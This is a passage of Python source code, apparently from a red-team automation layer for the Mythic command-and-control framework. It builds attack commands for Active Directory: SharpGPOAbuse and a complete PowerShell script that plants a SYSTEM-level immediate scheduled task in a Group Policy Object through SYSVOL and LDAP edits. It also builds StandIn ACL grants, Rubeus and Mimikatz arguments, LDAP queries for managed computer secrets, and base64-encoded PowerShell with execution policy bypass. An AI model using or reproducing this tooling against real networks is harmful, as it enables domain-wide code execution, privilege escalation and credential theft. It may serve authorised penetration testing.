    normalized = text.replace("/", "\\")
    low = normalized.casefold()
    for prefix in ("cifs\\", "host\\", "ldap\\", "http\\", "https\\", "wsman\\", "winrm\\"):
        if low.startswith(prefix):
            host = normalized[len(prefix):].strip("\\")
            return f"\\\\{host}\\C$" if host else ""
    if normalized.startswith("\\\\"):
        return normalized
    if "\\" not in normalized and ":" not in normalized:
        return f"\\\\{normalized}\\C$"
    return normalized


def _kerberos_service_ticket_spn(value: Any) -> str:
    text = _text(value).strip().strip('"')
    if not text or text.startswith("{{"):
        return text
    normalized = text.replace("\\", "/")
    if normalized.startswith("//"):
        host = normalized.lstrip("/").split("/", 1)[0]
        return f"cifs/{host}" if host else ""
    if "/" in normalized:
        return normalized
    return f"cifs/{normalized}"


def _managed_secret_powershell(
    domain_controller: str,
    search_base: str,
    target_host: str,
    target_domain: str,
    attributes: list[str],
) -> str:
    host = _short_host(target_host)
    fqdn = _host_fqdn(host, target_domain)
    ldap_root = f"LDAP://{domain_controller}/{search_base}" if domain_controller else f"LDAP://{search_base}"
    attrs = "@(" + ",".join(_ps_quote(attr) for attr in attributes) + ")"
    return (
        f"$root=[ADSI]{_ps_quote(ldap_root)};"
        "$s=New-Object DirectoryServices.DirectorySearcher($root);"
        f"$s.Filter='(&(objectClass=computer)(|(cn={_ldap_filter_escape(host)})(name={_ldap_filter_escape(host)})"
        f"(dNSHostName={_ldap_filter_escape(fqdn)})(sAMAccountName={_ldap_filter_escape(host)}$)))';"
        f"$attrs={attrs};"
        "$attrs|%{[void]$s.PropertiesToLoad.Add($_)};"
        "$r=$s.FindOne();"
        "if($r){$r.Properties.GetEnumerator()|%{\"$($_.Key)=$($_.Value -join ',')\"}}else{'NO_RESULT'}"
    )


def _ps_quote(value: Any) -> str:
    return "'" + _text(value).replace("'", "''") + "'"


def _ps_array(values: list[str]) -> str:
    return "@(" + ",".join(_ps_quote(value) for value in values) + ")"


def _ldap_filter_escape(value: Any) -> str:
    text = _text(value)
    return (
        text.replace("\\", r"\5c")
        .replace("*", r"\2a")
        .replace("(", r"\28")
        .replace(")", r"\29")
        .replace("\x00", r"\00")
    )


def _host_fqdn(host: str, domain: str) -> str:
    host_text = _text(host).strip(".")
    domain_text = _text(domain).strip(".")
    if not host_text or "." in host_text or not domain_text:
        return host_text
    return f"{host_text}.{domain_text}"


def _host_domain_from_target(value: Any) -> tuple[str, str]:
    text = _normalize(_text(value).strip().strip("\\/"))
    if not text:
        return "", ""
    if text.endswith("$"):
        text = text[:-1]
    parts = [part for part in text.split(".") if part]
    if len(parts) >= 3:
        return parts[0], ".".join(parts[1:])
    return _short_host(text), ""


def _short_host(value: Any) -> str:
    text = _normalize(_text(value).strip().strip("\\/"))
    if not text:
        return ""
    if "/" in text and not text.startswith("\\\\"):
        _, _, text = text.partition("/")
    if "@" in text:
        text = text.split("@", 1)[0]
    if text.endswith("$"):
        text = text[:-1]
    return text.split(".", 1)[0].strip()


def _domain_dn(domain: str) -> str:
    return ",".join(f"DC={part}" for part in _normalize(domain).split(".") if part)


def _is_current_kerberos_context(value: Any) -> bool:
    normalized = _normalize(value)
    return normalized in {"", "current", "default", "existing", "current-context", "current_kerberos_context"}


def _uses_agent_kerberos_cache(parameters: dict[str, Any]) -> bool:
    return _normalize(parameters.get("store")) in {
        "agent-cache",
        "current-cache",
        "current-luid",
        "ticket-cache",
    }


def _kerberos_operation_context(current_context: bool, agent_cache: bool) -> str:
    if current_context and agent_cache:
        return "current-agent-cache"
    if current_context:
        return "current"
    return "isolated"


def _inprocess_dotnet_tool_command(
    step: Any,
    config: dict[str, Any],
    provider: Any,
    tool_name: str,
    tool_arguments: str,
) -> MythicCapabilityCommandPlan:
    return _build_inprocess_dotnet_tool_command(
        step,
        config,
        load_command=_text(getattr(provider, "setup_command", "")),
        invoke_command=_text(getattr(provider, "command", "")),
        tool_name=tool_name,
        tool_arguments=tool_arguments,
    )


def _build_inprocess_dotnet_tool_command(
    step: Any,
    config: dict[str, Any],
    *,
    load_command: str,
    invoke_command: str,
    tool_name: str,
    tool_arguments: str,
) -> MythicCapabilityCommandPlan:
    load_tool_param = _adapter_text(config, "inprocess_dotnet_load_tool_param", "filename")
    invoke_tool_param = _adapter_text(config, "inprocess_dotnet_invoke_tool_param", "assembly")
    invoke_args_param = _adapter_text(config, "inprocess_dotnet_invoke_args_param", "arguments")
    missing = []
    if not load_command:
        missing.append("inprocess_dotnet_load_command")
    if not invoke_command:
        missing.append("inprocess_dotnet_invoke_command")
    if not tool_name:
        missing.append("tool")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="in-process dotnet provider needs load/invoke commands and a tool name",
        )
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, load_command, {load_tool_param: tool_name}),
        _command_from_step(step, invoke_command, {invoke_tool_param: tool_name, invoke_args_param: tool_arguments}),
    ])


def _command_from_step(
    step: Any,
    command: str,
    parameters: Any,
    produces: list[str] | None = None,
    consumes: list[str] | None = None,
    deferred: bool = False,
) -> MythicCapabilityCommand:
    return MythicCapabilityCommand(
        command=command,
        parameters=parameters,
        capability=_text(getattr(step, "capability", "")),
        purpose=_text(getattr(step, "purpose", "")),
        expected_probe=_text(getattr(step, "expected_probe", "")),
        operation=_normalize(getattr(step, "operation", "")),
        prerequisites=list(getattr(step, "prerequisites", []) or []),
        produces=list(produces or []),
        consumes=list(consumes or []),
        deferred=bool(deferred),
    )


def _command_with_artifacts(
    command: MythicCapabilityCommand,
    produces: list[str] | None = None,
    consumes: list[str] | None = None,
    deferred: bool | None = None,
) -> MythicCapabilityCommand:
    return MythicCapabilityCommand(
        command=command.command,
        parameters=dict(command.parameters),
        capability=command.capability,
        purpose=command.purpose,
        expected_probe=command.expected_probe,
        operation=command.operation,
        prerequisites=list(command.prerequisites),
        produces=list(produces or command.produces),
        consumes=list(consumes or command.consumes),
        deferred=command.deferred if deferred is None else bool(deferred),
    )


def _plan_with_terminal_artifacts(
    plan: MythicCapabilityCommandPlan,
    produces: list[str] | None = None,
    consumes: list[str] | None = None,
    deferred: bool | None = None,
) -> MythicCapabilityCommandPlan:
    if not plan.ok or not plan.commands:
        return plan
    commands = list(plan.commands)
    commands[-1] = _command_with_artifacts(
        commands[-1],
        produces=produces,
        consumes=consumes,
        deferred=deferred,
    )
    return replace(plan, commands=commands)


def _commands_with_operation(
    commands: list[MythicCapabilityCommand],
    operation: str,
) -> list[MythicCapabilityCommand]:
    if not operation:
        return list(commands)
    return [
        command if command.operation else replace(command, operation=operation)
        for command in commands
    ]


def _dedupe_redundant_inprocess_setup_commands(
    commands: list[MythicCapabilityCommand],
    config: dict[str, Any],
) -> list[MythicCapabilityCommand]:
    setup_command = _normalize(config.get("inprocess_dotnet_load_command"))
    if not setup_command:
        return list(commands)
    deduped: list[MythicCapabilityCommand] = []
    seen_parameters: list[Any] = []
    for command in commands:
        if _normalize(command.command) == setup_command:
            if any(command.parameters == parameters for parameters in seen_parameters):
                continue
            seen_parameters.append(command.parameters)
        deduped.append(command)
    return deduped


def _sharp_gpo_task_args(parameters: dict[str, Any]) -> str:
    pieces = [
        "--AddComputerTask",
        "--TaskName", _quote_cli(parameters.get("task_name")),
        "--Author", _quote_cli(parameters.get("author") or "NT AUTHORITY\\SYSTEM"),
        "--Command", _quote_cli(parameters.get("command")),
    ]
    arguments = _text(parameters.get("arguments"))
    if arguments.lstrip().startswith("-"):
        # CommandLineParser 1.x treats a following `--foo` token as a new outer option,
        # even when Apollo preserved it as one quoted argv value. Bind option-like inner
        # command lines with the long-option `=` form so SharpGPOAbuse receives them as
        # the `--Arguments` value instead of rejecting StandIn-style flags.
        pieces.append(_quote_cli("--Arguments=" + arguments))
    else:
        pieces.extend(["--Arguments", _quote_cli(arguments)])
    pieces.extend(["--GPOName", _quote_cli(parameters.get("gpo"))])
    if parameters.get("force", True) is not False:
        pieces.append("--Force")
    return " ".join(pieces)


def _sharpview_managed_secret_args(
    target_host: str,
    target_domain: str,
    domain_controller: str,
    search_base: str,
    attributes: list[str],
) -> str:
    target_identity = f"{target_host}.{target_domain}" if target_domain else target_host
    pieces = [
        "Get-DomainComputer",
        "-Identity", _quote_cli(target_identity),
        "-Domain", _quote_cli(target_domain),
        "-Server", _quote_cli(domain_controller),
        "-SearchBase", _quote_cli(search_base),
        "-Properties", _quote_cli(",".join(attributes)),
        "-FindOne",
    ]
    return " ".join(pieces)


def _gpp_immediate_task_script(parameters: dict[str, Any]) -> str:
    domain = _text(parameters.get("domain"))
    domain_dn = _domain_dn(domain)
    gpo = _text(parameters.get("gpo"))
    gpo_guid = _text(parameters.get("gpo_guid") or parameters.get("guid") or parameters.get("gpo_object_guid"))
    ldap_server = _text(parameters.get("ldap_server") or parameters.get("domain_controller") or parameters.get("dc"))
    task_name = _text(parameters.get("task_name"))
    author = _text(parameters.get("author") or "NT AUTHORITY\\SYSTEM")
    command = _text(parameters.get("command"))
    arguments = _text(parameters.get("arguments"))
    script = rf"""
$ErrorActionPreference = 'Stop'
function Escape-LdapFilter([string]$Value) {{
  if ($null -eq $Value) {{ return '' }}
  return $Value.Replace('\\','\\5c').Replace('*','\\2a').Replace('(','\\28').Replace(')','\\29').Replace([string][char]0,'\\00')
}}
function Escape-Xml([string]$Value) {{
  return [System.Security.SecurityElement]::Escape($Value)
}}
function Normalize-GpoGuid([string]$Value) {{
  if (-not $Value) {{ return '' }}
  $trimmed = $Value.Trim()
  if ($trimmed -match '^\{{[0-9A-Fa-f-]{{36}}\}}$') {{ return $trimmed }}
  if ($trimmed -match '^[0-9A-Fa-f-]{{36}}$') {{ return "{{" + $trimmed + "}}" }}
  return ''
}}
$domain = {_ps_sq(domain)}
$ldapServer = {_ps_sq(ldap_server)}
$gpoName = {_ps_sq(gpo)}
$gpoGuidInput = {_ps_sq(gpo_guid)}
$taskName = {_ps_sq(task_name)}
$author = {_ps_sq(author)}
$taskCommand = {_ps_sq(command)}
$taskArguments = {_ps_sq(arguments)}
$domainDn = {_ps_sq(domain_dn)}
$policyRoot = "\\$domain\\SYSVOL\\$domain\\Policies"
$explicitLdapServer = $ldapServer
function Resolve-LdapServer() {{
  if ($explicitLdapServer) {{ return $explicitLdapServer }}
  try {{
    $context = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $domain)
    $controller = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context).FindDomainController()
    if ($controller -and $controller.Name) {{ return [string]$controller.Name }}
  }} catch {{
  }}
  try {{
    $rootDse = New-Object System.DirectoryServices.DirectoryEntry('LDAP://RootDSE')
    $dnsHostName = [string]$rootDse.Get('dnsHostName')
    $defaultNamingContext = [string]$rootDse.Get('defaultNamingContext')
    if ($dnsHostName -and ($defaultNamingContext -ieq $domainDn)) {{ return $dnsHostName }}
  }} catch {{
  }}
  return $domain
}}
$ldapServer = Resolve-LdapServer
$ldapAuth = [System.DirectoryServices.AuthenticationTypes]::Secure
if ($ldapServer -and ($ldapServer -ine $domain)) {{ $ldapAuth = $ldapAuth -bor [System.DirectoryServices.AuthenticationTypes]::ServerBind }}
function New-LdapEntry([string]$Path) {{
  return New-Object System.DirectoryServices.DirectoryEntry($Path, $null, $null, $ldapAuth)
}}
function Set-GpoLdapAttributes([string]$DistinguishedName, [string]$Server, [string]$ExtensionsValue, [int]$VersionValue) {{
  Add-Type -AssemblyName System.DirectoryServices.Protocols
  $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($Server, 389, $false, $false)
  $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
  $connection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
  $connection.Credential = [System.Net.CredentialCache]::DefaultNetworkCredentials
  try {{ $connection.SessionOptions.Signing = $true }} catch {{}}
  try {{ $connection.SessionOptions.Sealing = $true }} catch {{}}
  $extensionMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
  $extensionMod.Name = 'gPCMachineExtensionNames'
  $extensionMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
  [void]$extensionMod.Add($ExtensionsValue)
  $versionMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
  $versionMod.Name = 'versionNumber'
  $versionMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
  [void]$versionMod.Add([string]$VersionValue)
  $mods = New-Object 'System.DirectoryServices.Protocols.DirectoryAttributeModification[]' 2
  $mods[0] = $extensionMod
  $mods[1] = $versionMod
  $request = New-Object System.DirectoryServices.Protocols.ModifyRequest -ArgumentList $DistinguishedName, $mods
  $response = $connection.SendRequest($request)
  if ($response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {{
    throw "LDAP modify failed for $DistinguishedName via ${{Server}}: $($response.ResultCode) $($response.ErrorMessage)"
  }}
}}
function Resolve-GpoGuidByDirectory([string]$Name) {{
  if (-not $Name) {{ return '' }}
  $normalized = Normalize-GpoGuid $Name
  if ($normalized) {{ return $normalized }}
  try {{
    $root = New-LdapEntry "LDAP://$ldapServer/CN=Policies,CN=System,$domainDn"
    $searcher = New-Object DirectoryServices.DirectorySearcher($root)
    $escaped = Escape-LdapFilter $Name
    $searcher.Filter = "(|(displayName=$escaped)(name=$escaped))"
    $searcher.SearchScope = "OneLevel"
    $null = $searcher.PropertiesToLoad.Add('name')
    $null = $searcher.PropertiesToLoad.Add('displayName')
    $result = $searcher.FindOne()
    if ($result -and $result.Properties['name'] -and $result.Properties['name'].Count -gt 0) {{
      return [string]$result.Properties['name'][0]
    }}
  }} catch {{
  }}
  return ''
}}
$gpoGuid = Normalize-GpoGuid $gpoGuidInput
if (-not $gpoGuid) {{
  $gpoGuid = Resolve-GpoGuidByDirectory $gpoName
}}
if (-not $gpoGuid) {{
  foreach ($candidate in Get-ChildItem -Path $policyRoot -Directory -ErrorAction Stop) {{
    $iniPath = Join-Path $candidate.FullName 'GPT.INI'
    $iniDisplayName = ''
    $ldapDisplayName = ''
    if (Test-Path $iniPath) {{
      foreach ($line in Get-Content -Path $iniPath -ErrorAction SilentlyContinue) {{
        if ($line -match '^displayName=(.*)$') {{
          $iniDisplayName = $Matches[1].Trim()
          break
        }}
      }}
    }}
    try {{
      $candidateObject = New-LdapEntry "LDAP://$ldapServer/CN=$($candidate.Name),CN=Policies,CN=System,$domainDn"
      $ldapDisplayName = [string]$candidateObject.Get('displayName')
    }} catch {{
      $ldapDisplayName = ''
    }}
    if (($candidate.Name -ieq $gpoName) -or ($iniDisplayName -ieq $gpoName) -or ($ldapDisplayName -ieq $gpoName)) {{
      $gpoGuid = $candidate.Name
      break
    }}
  }}
}}
if (-not $gpoGuid) {{ throw "GPO identity unresolved: could not resolve GPO '$gpoName' in domain '$domain' by GUID, LDAP displayName/name, or SYSVOL GPT.INI. Pass gpo_guid from BloodHound or SharpGPOAbuse output before retrying." }}
$gpoRoot = Join-Path $policyRoot $gpoGuid
$gpoDn = "CN=$gpoGuid,CN=Policies,CN=System,$domainDn"
$gpoObject = New-LdapEntry "LDAP://$ldapServer/$gpoDn"
try {{ $null = $gpoObject.psbase.NativeGuid }} catch {{ throw "GPO ADSI bind failed for $gpoGuid via ${{ldapServer}}: $($_.Exception.Message)" }}
$displayName = ''
try {{ $displayName = [string]$gpoObject.Get('displayName') }} catch {{ $displayName = '' }}
if (-not $displayName) {{ $displayName = $gpoName }}
$machineRoot = Join-Path $gpoRoot 'Machine'
$taskDir = Join-Path $machineRoot 'Preferences\\ScheduledTasks'
New-Item -ItemType Directory -Force -Path $taskDir | Out-Null
$uid = [guid]::NewGuid().ToString()
$changed = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
$startBoundary = (Get-Date).AddMinutes(-1).ToString('yyyy-MM-ddTHH:mm:ss')
$endBoundary = (Get-Date).AddYears(1).ToString('yyyy-MM-ddTHH:mm:ss')
$taskNameXml = Escape-Xml $taskName
$authorXml = Escape-Xml $author
$commandXml = Escape-Xml $taskCommand
$argumentsXml = Escape-Xml $taskArguments
$startXml = Escape-Xml $startBoundary
$endXml = Escape-Xml $endBoundary
$xml = "<?xml version=`"1.0`" encoding=`"utf-8`"?><ScheduledTasks clsid=`"{{CC63F200-7309-4ba0-B154-A71CD118DBCC}}`"><ImmediateTaskV2 clsid=`"{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}`" name=`"$taskNameXml`" image=`"0`" changed=`"$changed`" uid=`"$uid`"><Properties action=`"U`" name=`"$taskNameXml`" runAs=`"NT AUTHORITY\System`" logonType=`"S4U`"><Task version=`"1.3`"><RegistrationInfo><Author>$authorXml</Author><Description></Description></RegistrationInfo><Principals><Principal id=`"Author`"><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT10M</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>$startXml</StartBoundary><EndBoundary>$endXml</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=`"Author`"><Exec><Command>$commandXml</Command><Arguments>$argumentsXml</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>"
$taskFile = Join-Path $taskDir 'ScheduledTasks.xml'
Set-Content -Path $taskFile -Encoding UTF8 -Value $xml
$requiredExtensions = @(
  '[{{00000000-0000-0000-0000-000000000000}}{{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}}]',
  '[{{35378EAC-683F-11D2-A89A-00C04FBBCFA2}}{{D02B1F72-3407-48AE-BA88-E8213C6761F1}}]',
  '[{{AADCED64-746C-4633-A97C-D61349046527}}{{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}}]'
)
$extensions = ''
try {{ $extensions = [string]$gpoObject.Get('gPCMachineExtensionNames') }} catch {{ $extensions = '' }}
foreach ($extension in $requiredExtensions) {{
  if ($extensions.IndexOf($extension, [System.StringComparison]::OrdinalIgnoreCase) -lt 0) {{ $extensions += $extension }}
}}
$oldVersion = 0
try {{ $oldVersion = [int]$gpoObject.Get('versionNumber') }} catch {{ $oldVersion = 0 }}
$newVersion = $oldVersion + 1
Set-GpoLdapAttributes -DistinguishedName $gpoDn -Server $ldapServer -ExtensionsValue $extensions -VersionValue $newVersion
$gptPath = Join-Path $gpoRoot 'GPT.INI'
$gpt = "[General]`r`nVersion=$newVersion`r`ndisplayName=$displayName`r`n"
Set-Content -Path $gptPath -Encoding ASCII -Value $gpt
Write-Output "scheduled task xml valid: $taskFile"
Write-Output "cse extension registered: $extensions"
Write-Output "ldap version bumped: $oldVersion -> $newVersion"
Write-Output "gpt.ini version bumped: $newVersion"
Write-Output "command path present: $taskCommand"
Write-Output "ldap server selected: $ldapServer"
Write-Output "trigger start boundary: $startBoundary"
"""
    return script


def _ps_sq(value: Any) -> str:
    return "'" + _text(value).replace("'", "''") + "'"


def _ps_encoded_command(script: str) -> str:
    return base64.b64encode(script.encode("utf-16le")).decode("ascii")


def _standin_grant_args(target_dn: str, principal: str, guid: str) -> str:
    return " ".join([
        "--object", _quote_cli(_standin_object_filter(target_dn)),
        "--grant", _quote_cli(principal),
        "--guid", _quote_cli(guid),
    ])


def _standin_acl_read_args(target_dn: str, principal: str = "") -> str:
    pieces = [
        "--object", _quote_cli(_standin_object_filter(target_dn)),
        "--access",
    ]
    if principal:
        pieces.extend(["--ntaccount", _quote_cli(principal)])
    return " ".join(pieces)


def _standin_object_filter(target_dn: str) -> str:
    text = _text(target_dn).strip()
    if text.casefold().startswith("distinguishedname="):
        return text
    if text.casefold().startswith("dc="):
        return "distinguishedname=" + text
    return text


def _adapter_text(config: dict[str, Any], key: str, default: str) -> str:
    if key in config:
        return _text(config.get(key))
    return default


def _dotnet_runner_argument_limit(config: dict[str, Any]) -> int:
    try:
        value = int(config.get("dotnet_runner_max_argument_bytes") or 0)
    except (TypeError, ValueError):
        return 0
    return value if value > 0 else 0


def _input_bool(config: dict[str, Any], key: str, default: bool = False) -> bool:
    if key not in config:
        return bool(default)
    value = config.get(key)
    if isinstance(value, bool):
        return value
    normalized = _normalize(value)
    if normalized in {"1", "true", "yes", "y", "on"}:
        return True
    if normalized in {"0", "false", "no", "n", "off"}:
        return False
    return bool(default)


def _quote_cli(value: Any) -> str:
    text = _text(value)
    escaped = text.replace('"', '\\"')
    if not escaped:
        return '""'
    if any(ch.isspace() for ch in escaped) or any(ch in escaped for ch in (">", "<", "|", "&", "^")):
        return f'"{escaped}"'
    return escaped


def _rubeus_value(value: Any) -> str:
    text = _text(value)
    escaped = text.replace('"', '\\"')
    if not escaped:
        return '""'
    if any(ch.isspace() for ch in escaped) or '"' in text:
        return f'"{escaped}"'
    return escaped


def _cmd_quote(value: Any) -> str:
    text = _text(value)
    escaped = text.replace('"', '""')
    if not escaped:
        return '""'
    return f'"{escaped}"'


def _windows_arg(value: Any) -> str:
    text = _text(value)
    escaped = text.replace('"', '\\"')
    if not escaped:
        return '""'
    return f'"{escaped}"'


def _powershell_encoded_args(script: str) -> str:
    encoded = base64.b64encode(_text(script).encode("utf-16le")).decode("ascii")
    return f"-NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"


def _mimikatz_command_argument(value: Any, config: dict[str, Any]) -> str:
    text = _text(value).strip()
    if not _input_bool(config, "mimikatz_quote_command", default=True):
        return text
    if len(text) >= 2 and text[0] == '"' and text[-1] == '"':
        return text
    return '"' + text.replace('"', '\\"') + '"'


def _mimikatz_parameters(argument_param: str, command_text: str, config: dict[str, Any]) -> dict[str, Any]:
    parameters = config.get("mimikatz_parameters") if isinstance(config, dict) else None
    merged = dict(parameters) if isinstance(parameters, dict) else {}
    merged[argument_param] = command_text
    return merged


def _normalize(value: Any) -> str:
    return " ".join(_text(value).strip().casefold().split())


def _kerberos_key_flag(key_type: str) -> str:
    normalized = _normalize(key_type)
    if normalized in {"aes256", "aes256-cts-hmac-sha1-96"}:
        return "aes256"
    if normalized in {"aes128", "aes128-cts-hmac-sha1-96"}:
        return "aes128"
    if normalized in {"rc4", "ntlm", "nthash", "hash", "rc4-hmac"}:
        return "rc4"
    return ""


def _string_list(value: Any) -> list[str]:
    if isinstance(value, (list, tuple, set)):
        return [_text(item).strip() for item in value if _text(item).strip()]
    text = _text(value)
    if not text:
        return []
    return [part.strip() for part in text.replace(";", ",").split(",") if part.strip()]


def _text(value: Any) -> str:
    if value is None:
        return ""
    return str(value)
